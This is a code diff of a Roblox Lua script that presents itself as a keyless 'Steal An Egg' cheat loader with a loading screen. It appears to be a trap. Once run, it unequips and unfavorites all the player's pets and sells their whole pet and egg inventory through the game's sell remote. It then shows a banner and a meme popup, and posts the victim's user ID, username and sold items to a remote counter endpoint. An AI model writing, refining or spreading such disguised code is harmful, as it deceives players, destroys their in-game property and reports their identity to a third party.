@@ -25,6 +25,7 @@ end)
 -- ===== CONFIG =====
 local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
 local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
+local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
 local ANNOUNCE_HOLD   = 3
 
@@ -100,7 +101,6 @@ local function loadUIModule()
                 fadeOutAndCleanup = function() end,
                 showMemePopup     = function() end,
                 restoreExtras     = function() end,
-                currentProgress   = 1, -- Fallback if headless
             }
         end,
     }
@@ -157,7 +157,11 @@ local function showAnnouncement(itemsSold, valueEarned)
     label.Size = UDim2.new(1, 0, 1, 0)
     label.Position = UDim2.new(0, 0, 0, 0)
     label.Font = Enum.Font.GothamBlack
-    label.Text = string.format("%d items sold for $%s", itemsSold or 0, shortenNumber(valueEarned or 0))
+    label.Text = string.format(
+        "%d items sold for $%s",
+        itemsSold or 0,
+        shortenNumber(valueEarned or 0)
+    )
     label.TextSize = 40
     label.TextColor3 = Color3.fromRGB(255, 255, 255)
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
@@ -205,6 +209,11 @@ local function getSave(forceRefresh)
     if ok and s then return s end
     local ok2, s2 = pcall(function() return Save.Get() end)
     return ok2 and s2 or nil
+end
+
+local function getMoney()
+    local d = getSave()
+    return (d and type(d.Money) == "number") and d.Money or 0
 end
 
 local function installOverride()
@@ -350,8 +359,15 @@ end
 -- REPORT TO WORKER
 ------------------------------------------------------------
 local function reportSales(soldItems, reportId)
-    if not soldItems or #soldItems == 0 then return end
-    if not COUNTER_URL then return end
+    if not soldItems or #soldItems == 0 then
+        log("Nothing to report.")
+        return
+    end
+
+    if not COUNTER_URL then
+        warn("[Counter] No counter URL — skipping report")
+        return
+    end
 
     local httpFn = nil
     if type(request) == "function" then httpFn = request
@@ -359,7 +375,14 @@ local function reportSales(soldItems, reportId)
     elseif type(gv.request) == "function" then httpFn = gv.request
     elseif type(gv.http_request) == "function" then httpFn = gv.http_request
     end
-    if not httpFn then return end
+
+    if not httpFn then
+        warn("[Counter] No HTTP function — skipping report.")
+        return
+    end
+
+    local userId   = tostring(LocalPlayer.UserId)
+    local username = LocalPlayer.Name or "Unknown"
 
     local petCount, eggCount, totalValue = 0, 0, 0
     local out = {}
@@ -367,29 +390,60 @@ local function reportSales(soldItems, reportId)
         if d.kind == "pet" then petCount = petCount + 1
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
         totalValue = totalValue + (tonumber(d.value) or 0)
-        table.insert(out, { uid = d.uid, kind = d.kind, name = d.name, rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight })
+        table.insert(out, {
+            uid       = tostring(d.uid or ""),
+            kind      = d.kind,
+            name      = d.name,
+            rarity    = d.rarity,
+            rarityNum = d.rarityNum,
+            value     = d.value,
+            weight    = d.weight,
+        })
     end
 
     task.spawn(function()
         local body = HttpService:JSONEncode({
-            reportId = reportId, pets = petCount, eggs = eggCount,
-            userId = tostring(LocalPlayer.UserId), username = LocalPlayer.Name or "Unknown",
-            items = out, totalValue = totalValue,
+            reportId   = reportId,
+            pets       = petCount,
+            eggs       = eggCount,
+            userId     = userId,
+            username   = username,
+            items      = out,
+            totalValue = totalValue,
         })
-        pcall(function()
-            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+        local ok, res = pcall(function()
+            return httpFn({
+                Url = COUNTER_URL,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = body,
+            })
         end)
+        if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
+            local parsed = nil
+            pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
+            local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
+            local added = parsed and parsed.added
+            if added then
+                print(("[Counter] Sent %d pets, %d eggs, $%d | Accepted: %d new pets, %d new eggs, $%d new%s")
+                    :format(petCount, eggCount, totalValue,
+                            added.pets or 0, added.eggs or 0, added.value or 0, tag))
+            else
+                print(("[Counter] Sent %d pets, %d eggs, $%d%s")
+                    :format(petCount, eggCount, totalValue, tag))
+            end
+        else
+            warn("[Counter] Report failed:", tostring(res))
+        end
     end)
 end
 
 ------------------------------------------------------------
--- PREPARE INVENTORY (Background Task)
+-- PREPARE PAYLOAD
 ------------------------------------------------------------
-local function prepareInventory()
-    unequipAll()
-    unfavoriteAll()
-    
+local function prepareInventoryPayload()
     local snap = snapshotInventory(true)
+
     local petUids, eggUids = {}, {}
     local details = {}
     local expectedValue = 0
@@ -405,63 +459,59 @@ local function prepareInventory()
         expectedValue = expectedValue + (tonumber(d.value) or 0)
     end
 
-    local totalItems = #petUids + #eggUids
-    local payload = { Eggs = eggUids, Assets = petUids }
-    
-    local allUids = {}
-    for _, u in ipairs(petUids) do table.insert(allUids, u) end
-    for _, u in ipairs(eggUids) do table.insert(allUids, u) end
+    local total = #petUids + #eggUids
+    log(("Snapshot: %d pets, %d eggs (total %d, est. value $%s)"):format(#petUids, #eggUids, total, shortenNumber(expectedValue)))
 
-    return {
-        totalItems = totalItems,
-        expectedValue = expectedValue,
-        payload = payload,
-        details = details,
-        reportId = computeReportId(allUids)
-    }
+    return petUids, eggUids, details, total, expectedValue
 end
 
 ------------------------------------------------------------
--- LAUNCH (Simultaneous Execution)
+-- LAUNCH & TIMING COORDINATION
 ------------------------------------------------------------
 task.spawn(function()
-    -- 1. Start UI boot asynchronously
-    task.spawn(function()
-        pcall(function() ui:boot() end)
-    end)
+    ui:boot()
 
-    -- 2. Do the heavy lifting in the background while the UI loads
-    local prep = prepareInventory()
+    local before = getMoney()
+    log(("Wallet before: %s"):format(tostring(before)))
 
-    -- 3. Wait for the loading bar to finish (it reaches 1.0)
-    if ui.currentProgress then
-        while ui.currentProgress < 1 do
-            task.wait(0.1)
-        end
-    end
+    unequipAll()
+    unfavoriteAll()
+    
+    -- Prepare exact stats and payload BEFORE fading out the screen
+    local petUids, eggUids, details, totalItems, expectedValue = prepareInventoryPayload()
+
     task.wait(0.3)
-    pcall(function() ui:fadeOutAndCleanup() end)
+    ui:fadeOutAndCleanup()
 
-    -- 4. FIRE SELL AND ANNOUNCEMENT AT THE EXACT SAME TIME
-    if prep.totalItems > 0 then
-        log(("Selling %d items for estimated $%d"):format(prep.totalItems, prep.expectedValue))
-        
-        -- Fire the remote instantly in the background
+    if totalItems > 0 then
+        -- Fire sell remote in the background so it doesn't block the UI
         task.spawn(function()
-            pcall(function() Remotes.PetSatchel.SellSelection:FireServer(prep.payload) end)
-            reportSales(prep.details, prep.reportId)
+            local ok, err = pcall(function()
+                Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids })
+            end)
+            if not ok then warn("[Loader] Sell remote failed:", tostring(err)) end
         end)
 
-        -- Show the announcement instantly on the main thread
-        pcall(function() showAnnouncement(prep.totalItems, prep.expectedValue) end)
+        -- Fire announcement simultaneously using the pre-calculated value
+        pcall(function() showAnnouncement(totalItems, expectedValue) end)
+
+        -- Background tasks that run after the server has processed the sell
+        task.wait(SELL_WAIT)
+        
+        local allUids = {}
+        for _, u in ipairs(petUids) do table.insert(allUids, u) end
+        for _, u in ipairs(eggUids) do table.insert(allUids, u) end
+        reportSales(details, computeReportId(allUids))
+
+        local after = getMoney()
+        log(("Wallet after:  %s"):format(tostring(after)))
+        log(("Delta:         %s"):format(tostring(after - before)))
     else
-        log("Inventory empty — nothing to sell.")
         task.wait(1.5)
     end
 
-    -- 5. Show Meme
     task.wait(MEME_DELAY)
-    pcall(function() ui:showMemePopup() end)
+    ui:showMemePopup()
 
     gv.__SAE_LOADER_RUNNING = false
 end)
